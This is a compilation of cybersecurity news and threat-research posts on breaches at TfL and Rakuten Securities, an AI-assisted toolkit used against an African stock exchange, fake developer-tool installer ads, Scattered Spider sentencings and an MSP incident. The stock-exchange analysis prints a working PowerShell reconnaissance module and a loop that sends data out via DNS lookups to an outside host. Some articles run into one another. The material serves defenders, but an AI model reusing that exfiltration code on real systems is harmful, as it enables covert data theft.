Title: TfL Warns 265,000 Photocard Customers May Have Had Personal Data Exposed
Context: Commenting on the incident, Jamie Akhtar, CEO and co-founder at CyberSmart, warned that cybercriminals could use the compromised details to launch convincing phishing emails or...
Full Text:
Transport for London (TfL) has been impacted by a cyber incident, which may have exposed the personal data of around 265,000 photocard customers.

On November 16, unauthorized actors sent emails to Oyster Photocard customers from TfL’s system. TfL said these emails were “generated as a result of the compromise.”

The emails asked customers to create an account, despite them already having a photocard account.

In a statement shared with Infosecurity, Shashi Verma, TfL’s director of technology strategy & revenue, said the organization immediately took the TfL photocard website down while this was being investigated.

"While we acted swiftly, we now believe that around 265,000 photocard customers may have had their account details compromised as part of this incident,” he warned.

Oyster photocards are personalized smartcards which can be used by eligible customers for free or discounted travel across public transport in London.

Customers whose account details were potentially compromised include children with Zip Oyster cards, whose ages range from 5-18. However, Verma said he does not believe the names or date of births of any children with a Zip Oyster card have been compromised.

Other customer accounts that may have been affected are those who have 18+ Student Oyster cards, 18-25 Care Leaver Oyster photocards, 60+ London Oyster photocards, Apprentice Oyster photocards and Veterans Oyster photocard.

TfL’s current assessment is that no passwords, bank or payment card details or customer journey information were accessed in the breach.

Verma added that TfL, which manages most of London’s public transport network, has now contained the incident.

“Due to the speed with which this incident was identified and addressed, we believe that the number of customers who could have been affected was significantly reduced,” he said.

“We are continuing to investigate what has happened but have already contacted affected customers to make them aware of this,” Verma continued.

The body has informed the UK’s data protection regulator, the Information Commissioner’s Office (ICO), of the incident.

TfL Customers Urged to Change Passwords

While there is currently no evidence that the affected data has been misused, TfL said it will be asking all photocard customers to change their password, security question and answer. It also advises customers to change their password on any other online service using the same information.

Commenting on the incident, Jamie Akhtar, CEO and co-founder at CyberSmart, warned that cybercriminals could use the compromised details to launch convincing phishing emails or text messages impersonating TfL.

“Account holders should be particularly cautious of unexpected communications, avoid clicking suspicious links and always verify messages through TfL's official website or customer service channels,” Akhtar said.

The TfL photocard website remains offline at the time of writing and displays the following message: “We are currently investigating an issue where photocard customers have received emails asking them to create an account, when they already have a Photocard account. We have temporarily taken the TfL Photocard portal down while this is being investigated and apologise for any inconvenience this may cause.”

Current Oyster photocard customers can continue to travel as normal, while any customer who need to renew their photocard or query any journey history can still do so by contacting TfL’s Customer Services.

Verma said TfL hopes to restore the affected website services “as quickly as possible.”

TfL was previously impacted by a cyber-attack in September 2024, resulting in customer data being breached. This included Oyster refund data, encompassing bank account numbers and sort codes for around 5000 customers.

Two individuals, Owen Flowers, 18, and Thalha Jubair, 20, were each sentenced to five years and six months in prison after being convicted of offenses relating to the attack in July 2026, which the judge said was motivated in part by “selfish bravado” rather than purely financial gain.

TfL reckons its speedy response spared a considerable number of customers from having their details compromised. The transport operator says it has since contained the incident and contacted those potentially affected, though it is rather more forthcoming about what the hackers didn't get their hands on than what they did. TfL says no passwords, bank or payment card details, or customer journey information were compromised. It also believes the names and dates of birth of children with Zip Oyster cards were unaffected. Among those whose accounts may have been compromised are holders of Zip Oyster cards – issued to children as young as five – as well as students, apprentices, care leavers, veterans, and Londoners aged 60 and over. Despite the assurances about passwords, TfL says it will ask all photocard customers to change theirs, along with their security questions and answers. Those in the habit of recycling passwords across multiple websites are being advised to change them elsewhere, too. TfL says it has yet to find any evidence that the compromised data has been used and has notified the Information Commissioner's Office (ICO). The transport operator hasn't disclosed how the perpetrators got into its systems. Existing photocards will still let holders through the ticket barriers, though anyone needing to renew one or check their journey history will have to contact TfL's customer services team while the website is out of action. There's no word yet on when it'll be back. "We hope to restore the affected website services as quickly as possible," Verma said. TfL should be well versed in dealing with data breaches by now. In March, the transport operator told The Register it had notified more than 7 million customers following its September 2024 cyberattack. The hackers had accessed systems holding customers' names, email addresses, and home addresses, while around 5,000 customers were contacted as a priority because their bank account details may also have been compromised. Two teenagers were subsequently charged in connection with the attack, which authorities linked to the notorious Scattered Spider cybercrime crew. The ICO looked into that incident but opted not to take enforcement action against TfL, having deemed its response proportionate. There's nothing at present to suggest the two incidents are related. Londoners can at least rest assured that their Oyster photocards still work. Whether the information they handed over to obtain them is in someone else's hands is another matter. ®

Title: Major African Stock Exchange Targeted in AI-Assisted Attack
Context: In those attacks the group exploited the ProxyShell and ProxyLogon vulnerabilities in public-facing Microsoft Exchange servers to install web shells, and it used a backdoor that...
Full Text:
What the commands revealed

The commands used to run the modules give us an indication of what the attackers targeting this organization were interested in. In the modules’ commands, data is exfiltrated to a DNS server, and there's a sub-domain that changes according to what the command does – such as ‘spid1’ for Host and Process Enumeration and ‘awslocal1’ for Cloud and Devops Hunting, and so on. The functionalities of the modules included:

Host and Process Enumeration (spid1, proc2, proc3, smbctx1, smbsc1): Collects the machine name, current user identity, mapped network drives, SMB connections, and running process trees (including parent processes and full command-line arguments via WMI).

Cloud and DevOps Hunting (awslocal1): Searches for AWS CLI configurations, environment variables related to databases or secrets, and active processes for tools like Docker, Kubernetes, Terraform, Jenkins, and GitLab.

Web Server (IIS) Profiling (iis1, iisa1, iisp2): Interrogates IIS using the WebAdministration module to map out local websites, application pools, physical disk paths, bindings, and pool identity users.

Secret and Credential Scraping (cfg1, sites1, xpjs1, dep1, sysm1, sysh1, sysv2, gpp1, awsa1): Recursively scans local web roots, deployment directories (C:\Deployer), and the domain's SYSVOL network share. It specifically targets configuration files (.xml, .json, .env, web.config) looking for hardcoded passwords, Group Policy cpassword fields, AWS access keys, and database connection strings.

Database Probing (rdsnet1, scq1): Attempts direct TCP connections to an AWS RDS PostgreSQL instance on port 5432 and uses integrated Windows authentication to query a Microsoft SQL Server for system user and version data.

SharePoint and Source Code Enumeration (spf1, spl1, spd1, spd2, sps1, tfs1, tfs2): Loads the SharePoint PowerShell snap-in to iterate through all sites and document libraries, searching for files containing sensitive keywords like “aws”, “credential”, or “password”. It also queries Team Foundation Server (TFS) APIs for project lists.

API Exploitation and Lateral Movement (api1, api2, map1, dbg1, adm1, admt1, adm2, keys1, key4, xtok1, cscs1, ipo1): Probes an internal API for debugging endpoints. It then attempts to authenticate to an admin endpoint using hardcoded credentials to extract JWT tokens. Finally, it uses extracted tokens and API keys to query authenticated endpoints for user profiles and banking data.

SCCM Reconnaissance and Lateral-movement Targeting (cas1, wmi1, scq1, smbsc1): Queries the SCCM AdminService and WMI (SMS_R_System) to find which machine a given user, likely admin, last logged on to, and enumerates the SCCM server's shares.

Harvested-credential Validation (keys1, key4, xtok1): Cycles through several harvested x-api-key values and a bearer token against the same endpoints to see which one works.

Capital-markets Data Access (cscs1, ipo1): Queries critical endpoints for investor and market data

Signs of AI authorship

The case for AI authorship rests on how uniform the modules are. Each one opened with the same error-handling line, used the same outer try/catch, hex-encoded its output the same way and returned the same empty-output sentinel. The DNS exfiltration loop was copied byte for byte into all 41 modules. A programmer building a toolkit would normally write that function once, while a model asked for a standalone script each time has no reason to.

Variable names were generic, and error handling was uniformly verbose. One module contained a progress variable that no other module had, as if a model had improved a single script in isolation during iterative prompting. Another submitted an invalid credential as a deliberate test. The pace was also consistent with automated tooling, with a new module starting every few seconds. The level of detail included in the commands is another tell-tale sign that AI was used:

$ErrorActionPreference = 'SilentlyContinue' try { $a = [string]((& { $j=Start-Job -ScriptBlock {try{Get-WmiObject -ComputerName '<redacted>-SCCM.<redacted>.com' -Namespace 'root\sms\site_<redacted>' -Class SMS_R_System -Filter "LastLogonUserName='<redacted>'" -Property Name,LastLogonUserName,ResourceId -ErrorAction Stop|ForEach-Object{'NAME='+$_.Name+';USER='+$_.LastLogonUserName+';RID='+$_.ResourceId}}catch{'WMIERR='+$_.Exception.GetBaseException().Message}} if(Wait-Job $j -Timeout 18){Receive-Job $j}else{Stop-Job $j;'WMIERR=TIMEOUT'};Remove-Job $j -Force } | Out-String).Trim()) } catch { $a = 'ERR:' + $_.Exception.Message } $b = -join ([Text.Encoding]::UTF8.GetBytes($a) | ForEach-Object { $_.ToString('x2') }) if ($b.Length -eq 0) { $b = '454d505459' } for ($i = 0; $i -lt $b.Length; $i += 50) { $n = [Math]::Min(50, $b.Length - $i) $v = $b.Substring($i, $n) try { [Net.Dns]::GetHostAddresses("$i.$v.wmi1.danoam334iqjo0ap2scg6ofosjxfgqhsa.oast.pro") | Out-Null } catch {} }

None of these signals is conclusive on its own, but taken together they fit AI-assisted or AI-generated authorship better than they fit bespoke attacker tooling. We could not identify which model may have been used.

DNS exfiltration through a testing service

Each module hex-encoded its output, split it into 50 hex character chunks and resolved a DNS name for each chunk. The names were unique subdomains of a single token under oast[.]pro, a public out-of-band testing service. The output would have left the server as DNS lookups rather than as web requests, and it would have been collected by whoever controlled the token. This is the exfiltration loop as it appeared in the modules:

$b = -join ([Text.Encoding]::UTF8.GetBytes($a) | ForEach-Object { $_.ToString('x2') }) if ($b.Length -eq 0) { $b = '454d505459' } for ($i = 0; $i -lt $b.Length; $i += 50) { $n = [Math]::Min(50, $b.Length - $i) $v = $b.Substring($i, $n) try { [Net.Dns]::GetHostAddresses("$i.$v.<module>.<token>.oast[.]pro") | Out-Null } catch {} }

This is an unusual technique and may have been an additional attempt by the actors involved in this activity to stay under the radar and avoid detection.

Witchetty and the attribution question

Witchetty was first documented by ESET in April 2022 as one of three sub-groups of TA410, a cyberespionage operation with some links to the Cicada (aka APT10) group. In September 2022, we reported on Witchetty attacks carried out between February and September of that year against two governments in the Middle East and this same African stock exchange. In those attacks the group exploited the ProxyShell and ProxyLogon vulnerabilities in public-facing Microsoft Exchange servers to install web shells, and it used a backdoor that hid its payload in an image.

Six persistence implants were present on the server in April 2026, and one of the Witchetty implants was first seen in 2020. The toolkit was different. It was modular and focused on cloud secrets and financial APIs, and it ran from a web shell under the IIS worker process, which suggests that a vulnerability may have been exploited to gain access. Web shells on public-facing servers featured in the 2022 Witchetty attacks, but the focus on cloud secrets and financial APIs differs from the Witchetty activity we have seen in earlier cases. For that reason, we treat the implants and the toolkit separately.

Three explanations fit the evidence. Witchetty may have returned with new tooling. A second and more capable operator may have used the access that Witchetty established. Or an unrelated actor may have used the same compromise. We could not rule out any of them.

Significance

The toolkit is notable for how it was produced as much as for what it did. If the modules were generated by a model, an operator could produce 41 purpose-built scripts for one target without writing the shared plumbing by hand, and run them in a little over three minutes. The uniformity that points to AI authorship also gives defenders something to look for, since the same scaffold and exfiltration loop appeared in every module.

The targets of the credential tests were the exchange's own investment API and a securities depository gateway. We found no evidence of privilege escalation or data theft, and the results of the modules went to a collector that we cannot see. Whether any credentials or keys worked, and what the attackers intended to do with them, remains unknown. However, the targeting of a financial institution like a stock exchange is in itself significant and does seem to follow with the ongoing trend of attackers focusing on financial organizations, while now also using AI to carry out these attacks.

Protection

For the latest protection updates, please visit the Symantec Protection Bulletin.

If an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file.

Title: Threat Actors Abuse Suspected Compromised Google Ads Accounts to Target Developers with Fake Tools
Context: Malwarebytes documented how attackers phish advertiser accounts and then use them to run malicious ads
Full Text:
Executive summary

We investigated malicious Google ads promoting fake Codex, Claude Code, and Homebrew installers. The ads appeared under identities associated with apparently legitimate businesses unrelated to the advertised tools, suggesting compromised Google Ads accounts or misuse of advertiser identities. By combining familiar software brands with routine installation steps, the lures targeted developers and technically experienced users with instructions to run unsafe commands.

Building on our earlier Codex ClickFix analysis, we mapped shared infrastructure behind multiple Claude and Codex lures. Domain reuse and similar delivery scripts connect part of this activity to an Atomic macOS Stealer (AMOS)-associated delivery system. Additional analysis of a malicious macOS application delivered through Homebrew lookalikes reveals another delivery method, but does not establish a single operator or malware family across all cases. We continuously update Cato’s global blocklist with malicious infrastructure identified through our research.

Figure 1. Illustrated command-based route from a sponsored search result through a fake developer-tool installer to payload delivery.

Technical analysis

Advertiser abuse and redirects

Developer tool ads under unrelated business identities

A mismatch in the ads stood out. Ads for developer tools appeared under identities associated with real businesses whose products and services were unrelated to the advertised tools. We corroborated their business presence through company websites and independent reviews. In one example, a health and nutrition advertiser’s profile displayed product promotions alongside a malicious Codex ad. The Codex ad still contained fragments of health-product language. Figure 2 shows this example with the advertiser’s name redacted.

This mismatch supports our assessment of suspected account or advertiser-identity abuse. The redacted material also includes an Ahdoot & Wolfson notice investigating a potential data breach affecting the company. That notice does not establish that the Google Ads account was compromised or connect the potential breach to the malicious ad. Google’s advertiser identity verification does not confirm account compromise either.

Figure 2. Captured Codex ad and Google advertiser disclosure showing a developer-tool promotion under a health-and-nutrition business identity. The lower panel reproduces a separate potential-breach investigation notice. Names are redacted.

The advertiser may also be a victim. Malwarebytes documented how attackers phish advertiser accounts and then use them to run malicious ads. That reporting explains a possible mechanism for the mismatch we observed, without establishing how these particular ads were placed or who operated them.

Selective delivery through redirects

We followed a sponsored result for “claude code mac download” through a Google redirect to parentpreneurx[.]com. The destination presented Claude installation as a single-command task. This is the premise of ClickFix-style social engineering, which persuades a user to carry out the execution step by copying and running a command.

The same redirect chain exposed the installation lure under some access conditions and returned benign content under others. This behavior is consistent with traffic cloaking, where different visitors see different destinations or pages. It can make a malicious ad harder to investigate, although our observations do not isolate which visitor characteristic caused the difference.

The Homebrew investigation recorded similar Google /url redirects to homebrexwin[.]com and storageprofiler[.]com. The captured Claude request and one Homebrew request included source=gmail. A second Homebrew request omitted the source parameter. The Claude request used the q parameter for the destination and also included Google Ads tracking parameters. The source=gmail label does not establish that the visitor came from Gmail or that a Gmail account or Google’s redirect service was compromised. These redirect similarities prompted further investigation, while reuse of the same downstream domains provided stronger evidence of a connection between the Claude and Codex lures.

Shared infrastructure links Claude and Codex lures

Our main finding is that several sites impersonating different developer tools referenced the same downstream domains. The infrastructure records link Codex and Claude lures through basequill9[.]com and stride25[.]com. Another pair of Codex sites shares plume-compass[.]com. These are additional connections beyond the grove-satin[.]com link discussed in our earlier report.

Domain reuse across lures

Reuse of the same downstream domains across the investigated lures provides stronger evidence of a connection than shared CDN IP addresses or similar page designs. Figure 3 and the table summarize these overlaps. Some domains are described as C2-related in the investigation records, but their precise traffic roles remain unconfirmed.

These overlaps support our assessment that portions of the Claude and Codex activity are related. They could reflect one operator, shared tooling, or a common distribution service. Shared Cloudflare addresses alone cannot resolve that question. Cloudflare can sit between a visitor and a website, so its shared network addresses do not identify the underlying origin server or establish that two sites belong to one campaign.

The Claude loader and its connection to Codex

The Claude case shows how the infrastructure connection works in practice. Its fake installation page asked visitors to run one command, matching a workflow familiar to developers. Behind that instruction, the delivery chain reused grove-satin[.]com, which also appears in the August 17 Codex infrastructure records. Figure 4 reconstructs the lure.

Figure 4. Illustration of the Claude-branded installation lure at parentpreneurx[.]com and the instruction to retrieve remote content for execution in Terminal.

The command first displays an Apple App Store URL. It then decodes a separate URL hidden with Base64 encoding and retrieves a script from vine-96[.]com for execution in zsh. Displaying the Apple URL does not authenticate the separately retrieved script.

The loader disguises its active content as update and cache-maintenance work, reconstructs command names from variables, and derives an AES key from a calculated value. It decrypts an AES-128-CTR container, decompresses it with gunzip, and evaluates the recovered shell code. This resembles the encrypted-loader design observed in the Codex investigation.

The decoded stage sends a background HTTP POST to grove-satin[.]com/api/metrics/run?event=pasted with user and BuildID headers. Without waiting for that request to finish, the script attempts to retrieve the payload from vine-96[.]com, write it to /tmp/helper, remove extended attributes, make it executable, and launch it. Figure 5 separates the telemetry request from payload retrieval.

Figure 5. Claude shell-loader sequence. Background telemetry to grove-satin[.]com runs independently of payload retrieval from vine-96[.]com and the subsequent execution attempt.

Reuse of grove-satin[.]com and similarities in the encrypted loader link this Claude chain to the earlier Codex activity. The POST request is loader-stage telemetry and does not establish the final payload’s C2 or exfiltration destinations.

The loader and telemetry behavior support an AMOS-associated delivery assessment. SANS documented an AMOS infection chain with a Base64-decoded loader URL, an event=pasted telemetry request and a separate update-themed payload URL. These similarities support the delivery assessment without independently identifying the operator or proving that every payload in this report is AMOS.

Additional Codex infrastructure observations

Our earlier Codex report described malicious installer and benign decoy presentations on swiftsaverfin[.]com. The August 14 investigation notes identify the decoy as a fake TALLY application. Figure 6 illustrates those observations. The additional infrastructure finding is a change in the downstream domain associated with the lure.

Figure 6. Illustration of the Codex installer lure and TALLY-themed decoy recorded on the same host, swiftsaverfin[.]com.

The later infrastructure records associate swiftsaverfin[.]com with mossmesh17[.]com, described as a downloader or C2-related domain. NXDOMAIN was recorded for mossmesh17[.]com at the time of that check.

Additional delivery chains

Claude impersonation through JXA

Our infrastructure notes recorded claude-tools[.]com offering a DMG download. Analysis dated September 14 documented a separate ClickFix chain retrieving JavaScript for Automation (JXA) from the same domain. The JXA profiled the host and used the results to derive a key that unlocked an embedded downloader.

That downloader requested a macOS executable from kmtxyn[.]com/agent, built a counterfeit Finder.app in the user’s Application Support directory, and launched it while displaying a false installation error. Figure 7 shows the sequence. The analysis describes later selection of command-and-control servers through disk-image helper components, but does not provide the resulting addresses or confirm the malware family. We therefore classify kmtxyn[.]com as a payload host and do not link this chain to the Claude and Codex cluster on the available evidence.

Figure 7. The JXA loader from claude-tools[.]com derives a decryption key from host characteristics, retrieves a native payload from kmtxyn[.]com/agent and launches it in a Finder-masquerading application.

Homebrew lures and installation settings

The August Homebrew cases follow the same broad search-to-installer pattern, but the records do not include a recovered payload or confirmed C2 for homebrexwin[.]com or storageprofiler[.]com. We therefore keep those cases separate from the linked Claude and Codex activity.

Another lookalike, nomeibrew[.]com, obtained installation settings through /api/track.php?get_settings=1. The response supplied a genuine brew.sh redirect and a custom command that placed a Base64-encoded pirloz[.]com download before the real Homebrew installation command. Mixing an unrelated download with legitimate installer references can make the overall instruction look familiar.

There is an important limit to this evidence. The command uses curl -k, which disables TLS certificate verification for the pirloz request, and runs the genuine Homebrew installer only if that download succeeds. The captured snippet does not explicitly run the downloaded response. It therefore does not establish AMOS installation or a transition to the application-based delivery chain described next.

Figure 8. The nomeibrew[.]com settings API returns genuine Homebrew installer references alongside a Base64-encoded pirloz[.]com download URL.

Malicious macOS application delivered through Homebrew lookalikes

Analysis dated September 11 documented a separate disk-image delivery chain associated with nomeibrew[.]com and pirloz[.]com. The disk image contained a malicious arm64 macOS application named DayNote, which launched a helper script. Here, DayNote identifies the analyzed sample. Our findings do not establish any connection to legitimate applications using the same name. The helper retrieved update instructions from the daynotest GitHub account through jsDelivr. Because the URL referenced the repository’s main branch, its contents could change after the application had been distributed.

The update instructions concealed another URL using Base64 encoding. A later shell stage decrypted content with AES-128-CTR and decompressed it with gzip to recover instructions for retrieving the final macOS payload. These techniques also appear in the Codex and Claude shell-loader chains described above. Figure 9 illustrates this delivery sequence.

This application-based delivery chain extends our findings for nomeibrew[.]com and pirloz[.]com. The shared loader techniques provide another point of comparison, but do not independently establish a common operator or shared infrastructure with the Claude and Codex cluster. The captured settings command does not show how users reached the disk image, and the final payload’s malware family remains unidentified.

Figure 9. Delivery sequence of the malicious macOS application named DayNote, from its native launcher through GitHub-hosted update instructions, jsDelivr retrieval and encrypted shell stages to the tracked native payload.

How these findings relate to earlier research

Other ClickFix reports show similar methods without a confirmed infrastructure link

The Huntress Custom GPT investigation describes Google Ads directing users to attacker-created Custom GPTs, followed by a Google Sites ClickFix page and a Windows installer delivering remote-access malware. It shares the abuse of paid search and familiar platforms with our findings. The operating system, delivery sequence, and payload differ, and its listed delivery addresses do not appear in our infrastructure summary.

The CERT-UA UAC-0277 report, dated September 30, 2026, describes compromised websites presenting fake Cloudflare verification pages and using ClickFix instructions to deliver MSI packages associated with LUNEXSTEALER.

These reports provide context for similar social engineering. We have not established a shared operator or infrastructure connection between those cases and the activity described here. Impersonating Cloudflare verification is distinct from using Cloudflare’s services to deliver web traffic.

Homebrew impersonation predates this investigation

SecurityWeek reported in January 2025 that Google ads led users to brewe[.]sh and an AMOS installation command. Field Effect separately described hombrewe[.]sh distributing AmosStealer.

In October 2025, Hunt.io mapped at least 85 phishing domains associated with AMOS and Odyssey delivery. Iru documented fake Homebrew pages whose Copy buttons placed a hidden command on the clipboard.

SANS ISC traced a malicious Homebrew ad to a Google Sites lure and MacSync infection in May 2026. Moonlock described rotating Homebrew ads, possible advertiser-account takeovers, and a separate Claude impersonation campaign distributing MacSync. Together, these reports show repeated abuse of the same brands across different malware families. They do not establish one actor behind all the activity.

The legitimate Homebrew project has its own security and supply-chain protections. Fake installer pages try to influence the user’s choice of download source before those safeguards can help establish trust. Our findings do not demonstrate a compromise of Homebrew itself.

Cato protection

We continuously update Cato’s global blocklist with malicious infrastructure identified through our research. These updates support protection as operators change landing pages, telemetry destinations, and payload hosts.

Security teams can connect suspicious browser activity with a newly launched Terminal or shell, followed by unexpected downloads or execution. In these cases, useful leads include /tmp/helper, a Finder.app in a user-writable directory containing C8CB130D, the analyzed application’s helper scripts, and requests to the specific daynotest repository paths through jsDelivr. The IOC section provides the exact values. These contextual leads should be assessed together, rather than used to block legitimate shared services wholesale. Advertisers should review unexpected campaigns and changes to account access when suspicious ads appear under their identities.

Conclusion

The infrastructure map is the central finding of this follow-up. Domain reuse and similar loaders connect portions of the Claude and Codex activity beyond the individual lures covered in our earlier report. The additional JXA and application-based delivery chains show other routes to macOS payload delivery, while their operators and final malware families remain unconfirmed.

For defenders, the practical value comes from following the full path from the ad and installation instruction to the servers and files involved. A familiar advertiser identity or software brand does not authenticate the command a user is asked to run. Security teams can use the shared domains and delivery patterns documented here to investigate connections between suspicious ads, installer commands and downloaded files.

In this article

Scattered Spider used phishing texts and SIM swaps to steal $11.6 million in cryptocurrency

Tyler Robert Buchanan’s six-year sentence doesn’t mean the wider group has disappeared

Follow our advice to protect your phone number and accounts from SIM swapping

A US court has sentenced a member of the Scattered Spider cybercrime group to six years in prison. Tyler Robert Buchanan, a 24-year-old British man, joins four other group members in jail for his part in crimes that netted $11.6 million in proceeds.

Texts, SIM swaps and $11.6 million

Buchanan and his co-conspirators hacked at least a dozen companies in a years-long campaign, according to the Department of Justice. They sent hundreds of SMS phishing messages, also known as smishing, to employees at their target companies. The messages pretended to come from the employer or one of its contractors, such as an IT support provider. They contained links to phishing websites impersonating company websites and designed to steal usernames and passwords. The criminal group used those stolen credentials to access company systems.

The group also used SIM swapping to steal from individuals. In a SIM swap, a criminal tricks a mobile phone carrier into transferring a victim’s phone number to a SIM card the criminal controls. The criminal can then receive calls and text messages intended for the victim, including SMS authentication codes.

SIM swapping allowed Buchanan and his co-conspirators to take over cryptocurrency accounts and wallets, stealing over $11.6 million from victims.

Buchanan was arrested in Spain in May 2024 and taken into US custody in April 2025. He pleaded guilty to one count of conspiracy to commit wire fraud and one count of aggravated identity theft. He faced a maximum possible sentence of 22 years.

The other four defendants in the US case have also been sentenced. The longest sentence, 10 years, went to 22-year-old Floridian Noah Michael Urban, who pleaded guilty to fraud-related charges.

Joel Martin Evans , aged 27, of North Carolina, is now serving a two-year federal prison sentence for conspiracy to commit wire fraud. Ahmed Hossam Eldin Elbadawy and Evans Onyeaka Osiebo, both from Texas, each received 45-month sentences for wire fraud and aggravated identity theft.

Does this end the reign of Scattered Spider?

Experts say it’s unlikely, partly because the group is fragmented. Cybersecurity company Group-IB has warned that it contains different subclusters connected by shared tools and techniques. Members sometimes share online chats, too, but the subclusters act separately and rarely include more than five people, the company said.

There is also a significant overlap between Scattered Spider and an online group known as The Com, Group-IB said. The Com has been linked to child sexual abuse material and attacks on companies, including Allianz Life.

Other Scattered Spider members were also sentenced in the UK in July this year. Eighteen-year-old Owen Flowers and 19-year-old Thalha Jubair each received five-and-a-half-year sentences for a cyberattack on Transport for London (TfL). The youths live-streamed that attack in August 2024, which stole the personal data of up to 10 million TfL customers.

We also reported last month on the arrest of another person linked to Scattered LAPSUS$ Hunters. The name brings together three groups—Scattered Spider, LAPSUS$, and ShinyHunters—that have reportedly worked together on and off since summer 2025.

How to protect your number from SIM swapping

Phishing texts and SIM swaps can put both work systems and personal accounts at risk. These steps can make it harder for someone to take over your number or use it to access your accounts:

Ask your mobile carrier whether it offers an account PIN, port-out lock, or number-transfer protection. These can make it harder for someone to move your number to another SIM.

Where possible, use an authenticator app, passkey, or security key instead of SMS codes. These options aren’t tied to your phone number in the same way.

Never approve a sign-in prompt you didn’t initiate. Attackers may flood you with requests in the hope that you’ll approve one.

Scammers know more about you than you think.

Title: Rakuten Securities Breach Could Impact 15 Million Customers
Context: The firm, which is part of Japanese tech conglomerate Rakuten Group, issued an apology to customers on November 17, stating that it first discovered unauthorized access to its...
Full Text:
One of Japan’s leading online brokerages has revealed a major breach of customer account data which could impact nearly 16 million people.

Tokyo-headquartered Rakuten Securities allows retail investors to trade stocks, bonds, foreign exchange and other financial instruments.

The firm, which is part of Japanese tech conglomerate Rakuten Group, issued an apology to customers on November 17, stating that it first discovered unauthorized access to its systems the day before.

“As a result of our investigation, we confirmed that on Wednesday, November 11 some information managed within our test environment system may have been leaked to an external party,” it said. “We are continuing our investigation into the cause and detailed circumstances of the unauthorized access.”

Read more on Japanese breaches: Japan’s GMO Internet Urges Customers to Disconnect PCs

The securities giant said that branch/customer code, login ID, name, date of birth, address, phone number, email address, employer, withdrawal account details, annual income, asset information, and last login date for around 4.47 million accounts had been compromised.

An even larger group of 11.25 million accounts had just their Rakuten Securities branch/customer code and login IDs taken, it added.

The firm confirmed passwords, PINs and other information have not been taken and there’s no sign of unauthorized access to customer accounts.

Security experts questioned why production data was allowed to be used in a test environment.

“This isn’t some advanced security concept or something that requires sophisticated technology to address. It’s one of the most fundamental rules of protecting sensitive information, and yet we continue to see organizations make these mistakes,” argued Black Hills Information Security owner John Strand.ㅤ

“The proper way to do this is to have separate development, testing, and staging environments, each with clearly defined security controls.”

Rakuten Urges Passkey Adoption

Rakuten Securities warned customers of follow-on phishing attempts, presumably trying to trick individuals into handing over their logins.

It said over 90% of customers currently log in using phishing-resistant passkeys, and urged the remainder to switch to mitigate the risk of account takeover.

Last year, regulator the Financial Services Agency (FSA) warned of a sharp increase in account hijacking at Japanese securities companies, with hackers making illegal trades of over 304 billion yen ($2bn).

It claimed the hackers were attempting to manipulate the market by boosting the value of small-cap stocks that they own, in order to sell them at a bigger profit.

Rakuten Securities’ woes come at the end of a bad year for Japanese companies, which have been hit by a string of data breaches and extortion attacks.

They include Burger King (11 million customers), car rental company Times Car (6.6 million), karaoke giant Daiichi Kosho (8 million), and restaurant chain Yakiniku King (11 million).

In October, GMO, a virtual desktop company popular with foreign-exchange traders told customers to disconnect their machines from the internet after being breached by ransomware actors.

Title: RMM Alerts at 2 AM: An MSP and SOC Incident Response Story
Context: Once Huntress confirmed the attacker still had access, TruePath locked down the client's environment again and finished the cleanup it had started after the first incident
Full Text:
Cybercriminals don't check the clock before they go hunting for gaps. In early September, a 2am alert in the Huntress Security Operations Center (SOC) flagged suspicious remote monitoring and management (RMM) activity. It was in the client network of a managed service provider (MSP), TruePath IT, and close to 1,000 endpoints were at risk. Twelve days later, the alert queue lit up again, indicating that the attacker still had access to the environment. These two incidents cost the client an estimated $3 million in downtime and a lot of stress.

Learn how TruePath IT worked with Huntress to contain two rogue ScreenConnect deployments in less than two weeks, and how recovery plans shifted after the second incident was discovered.

One account, nearly 1,000 "doors"

In the initial incident, the attackers compromised an account with wide-reaching admin rights and used it to push out rogue ScreenConnect instances.

Figure 1: Huntress internal communication to communicate with the partner and contain the incident

ScreenConnect lets a technician take over a machine remotely to fix a problem, run scripts, and push updates. That's a great setup when it's your technician and a bad one when it's an attacker. This one put nearly 1,000 "doors" within reach of an unwanted intruder, and TruePath was responsible for the building.

The Huntress SOC runs 24/7, so they isolated the affected endpoints and sent a critical incident report right away.

Figure 2: Critical incident report from the Huntress SOC explaining the first rogue RMM incident

Why TruePath IT asked for the SOC phone call anyway

Tom Warren, Vice President of Operations at TruePath IT, stepped in just before 5am, to pick up where TruePath's CEO left off in handling the incident overnight. He had the incident report in hand, but asked for a phone call with the SOC anyway. The client would treat whatever he said next as final, so he wanted SOC support to talk through this specific incident and the impact of each decision.

Figure 3: How partners and customers can request SOC support

A SOC analyst was on a call in under 10 minutes, then joined a call with the client's IT director and stayed until the team felt ready to act. With the client's executive team closely watching the disruption, the IT director had solid, confirmed facts to carry up the chain as the incident response unfolded.

The pressure to reopen without enough cleanup

By the time the first wave of malicious activity had settled, the client had been down for about two days, and leadership wanted to know when business operations would return to normal.

Rushing recovery on a compromised network is risky, often causing more damage. TruePath had a priority-user list ready and released machines in targeted batches. Under pressure from leadership, though, the client's team put some endpoints that were still compromised back into use before they were fully cleaned up.

Groundhog Day, Rogue ScreenConnect Edition

A second rogue ScreenConnect instance showed up in the same environment 12 days later, this time delivering what looked like a ransomware executable. The attacker had kept their foothold on endpoints that went back into production before they were ready.

Once Huntress confirmed the attacker still had access, TruePath locked down the client's environment again and finished the cleanup it had started after the first incident.

That meant telling the client's CEO, who had just spent days recovering, that systems were going offline again. Logistics deadlines were slipping, and nobody could use their machines to qualify orders.

Trust, but Verify, One Endpoint at a Time

After the second lockdown, nothing returned to production until the client's IT team verified remediation work for each affected endpoint and an executive gave verbal approval. The lesson learned was that there has to be clear evidence of recovery before going back into production mode. The reopening was slower, but the client never had to read a ransomware note.

Pre-Game Your Next 2 am Alert

These conversations are much easier to have before an incident than during one. Whether you run IT for your own company or manage it for clients, answer these questions ahead of time:

If an active threat shows up, who's authorized to isolate the affected systems?

Who makes the decisions, and can your IT or security team act right away, or does someone need to sign off first?

Who communicates with leadership during an incident?

How much downtime can the business tolerate?

How quickly could you recover? Having backups doesn't automatically mean you can restore operations quickly.

A few technical habits also shrink the room an attacker has to work with:

Decide which remote access tools belong in your environment and block everything else by default.

Watch what normally runs in your environment before you enforce anything, then clean up what shouldn't be there, like leftover software from a previous IT provider, a project, or a trial that never moved forward.

Look at your network from the outside. Find which ports and services are exposed to the internet, and decide which need tighter protection, such as a hardened firewall policy.

Watch the full livestream, "Inside the Incident: What Happens When Our SOC Calls", to learn what good SOC support at 2am looks like.

Title: My IoT devices are no longer supported – is my smart home safe?
